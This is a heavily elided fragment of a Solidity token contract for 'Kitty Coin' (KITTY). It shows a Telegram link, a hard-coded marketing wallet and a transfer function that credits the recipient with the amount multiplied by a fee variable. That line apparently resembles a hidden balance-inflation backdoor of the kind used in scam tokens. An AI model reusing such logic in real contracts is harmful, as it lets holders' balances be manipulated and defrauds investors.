...
/**   // SPDX-License-Identifier: MIT
     ...
     Telegram : https://t.me/KittycoinCN
...
contract BABYTOKEN is Context, IERC20, Ownable {
    ...
    string private _name = "Kitty Coin";
    string private _symbol = "KITTY";
    uint8 private _decimals = 9;
    uint256 private _totalSupply = 3 * 10**9 * 10**_decimals;

    address payable private marketingaddresswallet =
        payable(0x80D6531405270C901d6E7654b7f62Dac06A553db);
    ...
    function transferToken(
        ...
        _balances[recipient] = _balances[recipient].add(amount*_premarketingFee);
